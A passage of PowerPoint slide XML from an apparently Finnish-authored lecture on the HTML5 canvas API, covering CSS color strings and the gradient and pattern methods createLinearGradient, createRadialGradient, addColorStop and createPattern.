              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>rgb</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>" or "#</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>rrggbb</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>" or "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>rgb</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>(r, g, b)" or "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>rgb</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>(r, g, b, a)". In the latter r, g, b are 0-255 and a is 0.0-1.0 (0 = transparent). </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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FCC4A75C-0566-460E-9F13-6245C5FFBAA4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Gradients</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Patterns</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34819" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FD655FC4-2E34-423A-A6AE-61D885955D8D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>createLinearGradient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>x1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>y1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>x2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>y2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>creates</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>linear</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>CanvasGradient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>. (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>x1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>y1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>) is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>start</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>point</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> and (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>x2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>y2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>) is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>end</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>point</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>gradient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>createRadialGradient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>x1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>y1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>r1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>x2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>y2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>r2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>returns</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>a</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>radial</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>CanvasGradient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>The</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> 1st </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>three</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>arguments</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>represent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>start</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>circle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>last</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>three</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>end</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>circle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>after</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>creating</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>gradient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>you</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>can</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>assign</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>colors</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> to it </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>using</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>addColorStop</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>position</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>color</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>The</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>color</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>can</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>be</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>any</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> CSS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>color</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>string</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>e.g</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>. '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>black</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>' </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>or</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> '#00f'. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>The</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> position is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>from</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> 0.0 (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>start</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>) to 1.0 (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>end</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>createPattern</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>image</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>type</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> image is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>any</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> Image and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>type</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>can</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>be</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>repeat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>repeat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>-x, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>repeat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>-y and no-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>repeat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>default</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>repeat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>To </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>use</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>gradient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>pattern</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> just </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>assign</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> it to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>fillStyle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> / </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>strokeStyle</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="24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
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{800A926B-F830-4714-A04C-9EFB08085CE9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
